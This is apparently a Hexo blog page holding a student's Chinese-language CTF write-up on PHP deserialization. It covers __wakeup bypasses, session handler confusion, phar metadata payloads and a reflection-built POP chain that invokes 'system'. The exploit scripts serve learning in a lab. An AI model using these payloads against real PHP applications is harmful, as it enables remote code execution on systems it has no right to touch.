@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>测试文章 | Hexo</title><meta name="author" content="xiexie"><meta name="copyright" content="xiexie"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="__construct创建对象时初始化对象__destruct销毁对象时清理资源__toString对象当字符串用时定义对象字符串表示__call调用不存在方法时动态方法处理__get读取不存在属性时动态属性读取__set设置不存在属性时动态属性设置__isset检测不存在属性时自定义属性检测__unset删除不存在属性时自定义属性删除 一边做题一边补充知识点吧。  这一关先定义了一个类，里面的函">
+<meta property="og:type" content="article">
+<meta property="og:title" content="测试文章">
+<meta property="og:url" content="http://example.com/2025/12/23/task7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="__construct创建对象时初始化对象__destruct销毁对象时清理资源__toString对象当字符串用时定义对象字符串表示__call调用不存在方法时动态方法处理__get读取不存在属性时动态属性读取__set设置不存在属性时动态属性设置__isset检测不存在属性时自定义属性检测__unset删除不存在属性时自定义属性删除 一边做题一边补充知识点吧。  这一关先定义了一个类，里面的函">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-12-23T12:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-24T08:43:34.512Z">
+<meta property="article:author" content="xiexie">
+<meta property="article:tag" content="学习task">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "测试文章",
+  "url": "http://example.com/2025/12/23/task7/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2025-12-23T12:00:00.000Z",
+  "dateModified": "2025-12-24T08:43:34.512Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xiexie",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/12/23/task7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '测试文章',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">测试文章</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">测试文章</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-23T12:00:00.000Z" title="发表于 2025-12-23 20:00:00">2025-12-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-24T08:43:34.512Z" title="更新于 2025-12-24 16:43:34">2025-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Obsidian%E7%AC%94%E8%AE%B0/">Obsidian笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-12-24 16:43:34&quot;}" hidden></div><p>__construct创建对象时初始化对象<br>__destruct销毁对象时清理资源<br>__toString对象当字符串用时定义对象字符串表示<br>__call调用不存在方法时动态方法处理<br>__get读取不存在属性时动态属性读取<br>__set设置不存在属性时动态属性设置<br>__isset检测不存在属性时自定义属性检测<br>__unset删除不存在属性时自定义属性删除</p>
+<p>一边做题一边补充知识点吧。</p>
+<ol>
+<li>这一关先定义了一个类，里面的函数是_destruct，也就是对象销毁之后自动执行，含有&#x2F;&#x2F;和&#x2F;都直接die，然后还有一个wakeup，是在反序列化的时候自动执行，会将查看的文件改为index.php，那么我们需要做到的是，绕过wakeup，在网上学习的方法，只要将序列化后的属性值改大，就可以绕过wakeup，这里问了ivory学长，<strong>最好不要手打序列化的结果，而是php里面自动输出，并且套一层urlencode，这里在下一关会埋下伏笔。</strong> 然后贴上我的源码，</li>
+</ol>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class SoFun&#123;</span><br><span class="line">    protected $file=&#x27;flag1.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = new SoFun();</span><br><span class="line">echo urlencode(serialize($obj));</span><br><span class="line"></span><br><span class="line">?&gt;```</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>，但是我发现转码过后我有点找不到属性值在哪了，太混乱了，所以我先没有转码了，而是先得到序列化之后的东西，然后就是把1改成2，然后再转码。<br>2. 这里是wakeup之后，就可以响应，我们看这个正则匹配，不能是o或者c，然后加一个冒号，然后加一个数字，这就刚好限制了O：2（举个例子，就这种的都不行），而且后面还有这个不分大小写，那么大小写绕过就被淘汰了。这里在网上看到的，在数字面前加一个+，就可以绕过，就是这里，我太蠢了，我居然在url里面直接打了一个+，我都忘了之前sql注入的时候，+会被自动当作空格，然后就去找对应的编码，是%2b</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class funny&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$obj = new funny();</span><br><span class="line"></span><br><span class="line">echo serialize($obj);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到O:5:”funny”:0:{}，然后在5前面加上%2b<br>3. 看第三关，定义了两个属性，然后如果wakeup的话，就会把一个不知道的东西赋给password，如果password严格等于verity的话，就得到flag。这个确实是没有头绪，然后去问了ai，说在类的内部就直接是他们共享一个值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php class funny &#123;</span><br><span class="line">    private $password;</span><br><span class="line">    public $verify;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;verify = &amp;$this-&gt;password; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = new funny();</span><br><span class="line">echo urlencode(serialize($o));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>&#x3D;&amp;是引用符号，这样就可以让这两个属性持续相等。<br>4. ini_set() 设置 PHP 的会话序列化处理器为php_serialize，会话数据将以 PHP 的默认序列化格式进行存储 GET 变量 tryhackme 的值存储到  $_SESSION  数组中，这个数组最终被序列化 Session：服务器用来存储用户会话状态（比如登录状态、用户 ID、购物车信息）的机制，避免每次请求都重新验证用户<br>PHP 中 session 序列化的关键细节</p>
+<ul>
+<li>PHP 默认使用<code>php</code>序列化处理器（对应<code>serialize()</code>函数），也支持<code>php_serialize</code>、<code>php_binary</code>等格式。它对<code>$_SESSION</code>的序列化规则非常特殊：<br>对于 <code>$_SESSION[&#39;键名&#39;] = 数据</code>，最终存储的字符串格式是：<code>键名|序列化后的数值</code></li>
+<li>session 数据默认存储在服务器的临时文件中（比如<code>/tmp/sess_xxxxxx</code>，<code>xxxxxx</code>是 session_id）。<br>典型的 session 反序列化漏洞，即两个⻚面设置的的session 序列化方式不同<br>这里42是能通过直接创建一个funny的实例 销毁了过后直接就flag了 4这里是储存到会话 然后serialize() 负责 “写入 session 数据”（用<code>php_serialize</code>格式）php处理器解析 session 数据时，会按第一个 | 把字符串拆成「键名」和「要反序列化的值」<code>|</code>左边被当成空键名，<code>|</code>右边的<code>funny</code>对象序列化字符串会被当成 “值”，触发反序列化。<br>class funny{<br>  public $a;<br>}<br>$x &#x3D; new funny;<br>echo urlencode(“|” . serialize($x));<br>全过程 php处理器解析 session 数据：<br>把a:1:{s:8:”tryhackme”;s:31:”|O:5:”funny”:1:{s:1:”a”;N;}”;}当成普通字符串（因为php处理器不认识php_serialize的数组格式）；<br>按第一个 | 分割：左边是a:1:{s:8:”tryhackme”;s:31:”（被当成键名），右边是O:5:”funny”:1:{s:1:”a”;N;}（被当成 “值”）；<br>PHP 自动对右边的funny对象序列化字符串执行unserialize() → 生成funny对象</li>
+</ul>
+<ol start="5">
+<li>这里其实并不是在考pop链，我们看条件很简单，只需要创建一个对象然后就出发类里面的第一个函数construct，之后等结束又出发destruct，就自动出flag了，那么重要的就是看他是怎么反序列化的，发现这里对序列化的结果有要求，ascii，这个之前做sql的时候学过，反正注意这里的属性是私有化的，那么在序列化之后就会在类名和属性名前都加上空格\0，这个的ascii码是0，直接死了，可以用16进制过了。</li>
+<li>$a() 意味着</li>
+</ol>
+<ul>
+<li>PHP会尝试调用 <code>$a</code> 这个变量</li>
+<li>如果 <code>$a</code> 是函数名，就调用该函数</li>
+<li>如果 <code>$a</code> 是数组 [对象, 方法名]，就调用该对象的方法，</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class funny &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$array=[new funny(),&#x27;pyflag&#x27;];</span><br><span class="line"></span><br><span class="line">echo serialize($array);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样子就可以做到调用new funny-&gt;pyflag,然后响应flag，这道题完全没有用到魔术方法，只用类本身的方式来做。<br>7. 先看到有个__destruct，在对象被销毁的时候自动响应flag，然后又看到下面，先得到a传参的值 b还传一个  内层的  if  检查文件是否已存在，else if  拼接文件路径  $filename &#x3D; “.&#x2F;upload&#x2F;&lt;<br>随机数&gt;.txt”  。然后获取 GET 参数  data，将 base64 解码内容写入到文件 $filename<br>这里学到的新知识 结合ai还有文章<br>先明确：phar 是什么？<br>phar 是 PHP 的归档文件格式（类似 ZIP），用于打包多个 PHP 文件 &#x2F; 资源成一个文件，方便分发和使用。<br>它的核心结构包含 4 部分：<br>Stub（标识头）：必须以<?php __HALT_COMPILER(); ?>结尾，是 PHP 识别 phar 文件的标记（可自定义前缀，比如伪装成图片：GIF89a<?php __HALT_COMPILER(); ?>）。<br>Manifest（清单）：存储 phar 包含的文件信息 +元数据（metadata）—— 而元数据是用serialize()序列化后存储的（这是漏洞的关键！）。<br>文件内容：归档的实际文件数据。<br>签名：可选的完整性校验信息</p>
+<p>PHP 在<strong>解析 phar 文件</strong>时，会自动将其元数据（序列化后的字符串）进行<strong>反序列化操作</strong>—— 无论你用什么函数读取 phar 文件，只要触发了 phar 的解析，元数据就会被反序列化。</p>
+<p>而 PHP 的很多<strong>文件操作函数</strong>（如<code>file_exists()</code>、<code>file_get_contents()</code>、<code>fopen()</code>、<code>unlink()</code>等）支持<code>phar://</code>协议（类似<code>file://</code>），只要给这些函数传入<code>phar://文件路径</code>，就会触发 phar 文件的解析，进而触发元数据的反序列化。</p>
+<p>如果元数据中包含<strong>恶意序列化对象</strong>（比如带有<code>__wakeup()</code>、<code>__destruct()</code>等魔术方法的类，这些方法会在反序列化时自动执行），就会触发代码执行，形成漏洞。![[Pasted image 20251220184050.png]]<br>然后读取文件内容，进行编码<br>$content &#x3D; file_get_contents(‘a.phar’);<br>echo urlencode(base64_encode($content)) . “<br>“;<br>我贴一下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 1. 定义核心恶意类：funny</span><br><span class="line">class funny&#123;</span><br><span class="line">    // __destruct()是PHP魔术方法：当对象被销毁（如脚本结束、unset、反序列化后）时自动执行</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        // global $flag：声明使用全局变量$flag（目标服务器中通常存储flag）</span><br><span class="line">        global $flag;</span><br><span class="line">        // 输出$flag——这是漏洞利用的最终目标（获取flag）</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 2. 清理旧文件：避免同名文件导致创建失败</span><br><span class="line">// @：抑制unlink的错误（比如文件不存在时的报错）</span><br><span class="line">@unlink(&quot;exp1.phar&quot;);</span><br><span class="line"></span><br><span class="line">// 3. 创建phar文件核心流程</span><br><span class="line">// 实例化Phar类，创建exp1.phar文件（后缀必须是.phar，PHP识别phar文件的基础）</span><br><span class="line">$phar = new Phar(&quot;exp1.phar&quot;);</span><br><span class="line"></span><br><span class="line">// 开启phar缓冲区：所有操作先写入内存，不直接刷到磁盘（避免频繁IO）</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">// 设置phar的Stub（标识头）：必须以&lt;?php __HALT_COMPILER(); ?&gt;结尾，PHP才能识别为phar文件</span><br><span class="line">// 这是phar文件的“身份标识”，无此内容PHP不会解析为phar文件</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line"></span><br><span class="line">// 关键：创建funny类的实例（对象）</span><br><span class="line">$b =new funny();</span><br><span class="line"></span><br><span class="line">// 将funny对象存入phar的元数据（metadata）</span><br><span class="line">// 注意注释：不用手动serialize()——Phar类会自动将传入的对象序列化后存入manifest（清单）</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line"></span><br><span class="line">// 向phar归档中添加一个空文件（test.txt），内容为&quot;test&quot;</span><br><span class="line">// 核心要求：phar文件必须包含至少一个文件内容（否则创建失败），这行是满足格式要求的“占位符”</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">// 结束缓冲区：将内存中的操作刷到磁盘，自动计算phar文件的签名（完成创建）</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">// 4. 读取并编码phar文件内容</span><br><span class="line">// 读取生成的exp1.phar文件的二进制内容</span><br><span class="line">$content = file_get_contents(&#x27;exp1.phar&#x27;);</span><br><span class="line"></span><br><span class="line">// 先base64编码（处理二进制内容），再urlencode（避免传输时乱码），最后换行</span><br><span class="line">echo urlencode(base64_encode($content)) . &quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>上传过后 会给一个路径 这就是文件所在的路径 去反序列化它 也就是php解析它就可以了<br>8. 这道题有很多个类，每个类里面都有不止一个函数，那么我们肯定想的是构造pop链，先确定要怎么触发，我们先来确定开始和终点，这里源码的末尾，是把发送的东西反序列化了，我们就可以先想到开头，可能会是c类里面的construct。a类里面的resolve函数应该是终点，因为里面就可以响应到flag，假设一下 比如起点是最好触发的destruct开始 这里会调用一个add方法 是不存在的方法call 这里这个函数 拼接起来就是调用到addme方法嘛 然后会返回字符串  就到了tostring 这里访问了string属性 并不存在于a里面 那么触发get get($name) 里的 $name，<br>永远等于你写在 -&gt; 后面的那个名字    前面属性名是 字面量 string<br>插入规则 规则原文级别的结论<br>当访问<br>obj-&gt;prop 时，如果该属性在当前作用域中不可访问，PHP 会调用 get(“prop”) 也就是说$this-&gt;string<a href="">“string”</a>;调用resolve<br>看了半天wp 也没有看懂这个为啥能用到 这里补充知识点<br>array_walk：这个函数接受一个数组和一个回调函数，将数组中的每个元素作为参数<br>传递给回调函数<br>此外，将一个对象传递给需要数组的函数时，PHP 会将对象转换为对象的公共属性<br>数组来处理，所以第一个参数可以传 $this<br>对象传入 array_walk 时，它会遍历对象的每个公共属性，并将每个属性值和属性名<br>传递给回调函数，回调函数两个参数分别为 属性值 和 属性名<br>原来如此 那么我先尝试自己口述一次<br>先创造个a1实例 销毁后调用des 为了触发call a1的this-&gt;object作为b 这里用到addme 会出字符串<br>当 PHP 执行：<br>“字符串” . $x</p>
+<ul>
+<li><p><code>$x</code> 是字符串 → 直接用</p>
+</li>
+<li><p><code>$x</code> 是数字 → 转字符串</p>
+</li>
+<li><p><strong><code>$x</code> 是对象 → 尝试调用 <code>$x-&gt;__toString()</code></strong><br>触发tostring<br>然后call  c &#x3D; new c(array(“string”&#x3D;&gt;array($a2, “resolve”)));<br>创建一个对象 <code>c</code>，<br>它的私有属性 <code>$string</code> 是一个数组，<br>当别人访问 <code>$c-&gt;string</code> 时，<br>就自动调用 <code>$a2-&gt;resolve()</code>。<br>私有属性不知道怎么搞了<br>看了文章的反射</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$refc = new ReflectionClass($c);</span><br></pre></td></tr></table></figure>
+<p><strong>内部结构对象</strong> 此时 <code>$refc</code> 里包含：</p>
+<ul>
+<li>类名</li>
+<li>所有属性（包括 private）</li>
+<li>所有方法</li>
+<li>可见性信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$propString = $refc-&gt;getProperty(&#x27;string&#x27;);</span><br></pre></td></tr></table></figure>
+<p>在类 c 里，找到那个叫 <code>string</code> 的属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$propString-&gt;setAccessible(true);</span><br></pre></td></tr></table></figure>
+<p> 强行关闭可见性检查 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$propString-&gt;setValue($c, [&quot;string&quot; =&gt; [$a2, &quot;resolve&quot;]]);</span><br></pre></td></tr></table></figure>
+<p>直接往对象内存里写值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a &#123;</span><br><span class="line">    public $object;</span><br><span class="line">    public $ls; // 必须有这个属性，值为[&#x27;system&#x27;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class b &#123;</span><br><span class="line">    protected $filename; // 受保护属性，需通过反射赋值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class c &#123;</span><br><span class="line">    private $string; // 私有属性，需通过反射赋值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 1. 构建最终触发resolve的a实例（a2）</span><br><span class="line">$a2 = new a();</span><br><span class="line">$a2-&gt;ls = [&#x27;system&#x27;]; // 满足resolve的条件：$prev=ls，$fn[0]=system</span><br><span class="line"></span><br><span class="line">// 2. 构建c实例，让其__get触发a2-&gt;resolve()</span><br><span class="line">$c = new c();</span><br><span class="line">// 反射给c的private $string赋值：$c-&gt;string[&quot;string&quot;] = [$a2, &quot;resolve&quot;]</span><br><span class="line">$refc = new ReflectionClass($c);</span><br><span class="line">$propString = $refc-&gt;getProperty(&#x27;string&#x27;);</span><br><span class="line">$propString-&gt;setAccessible(true);</span><br><span class="line">$propString-&gt;setValue($c, [&quot;string&quot; =&gt; [$a2, &quot;resolve&quot;]]);</span><br><span class="line"></span><br><span class="line">// 3. 构建被b引用的a实例（a1），其object指向c</span><br><span class="line">$a1 = new a();</span><br><span class="line">$a1-&gt;object = $c; // a1的__toString触发c的__get</span><br><span class="line"></span><br><span class="line">// 4. 构建b实例，给protected $filename赋值为a1</span><br><span class="line">$b = new b();</span><br><span class="line">$refb = new ReflectionClass($b);</span><br><span class="line">$propFilename = $refb-&gt;getProperty(&#x27;filename&#x27;);</span><br><span class="line">$propFilename-&gt;setAccessible(true);</span><br><span class="line">$propFilename-&gt;setValue($b, $a1); // b的addMe触发a1的__toString</span><br><span class="line"></span><br><span class="line">// 5. 构建入口a实例，其object指向b（触发__destruct）</span><br><span class="line">$a = new a();</span><br><span class="line">$a-&gt;object = $b;</span><br><span class="line"></span><br><span class="line">// 序列化并URL编码</span><br><span class="line">echo urlencode(serialize($a));</span><br><span 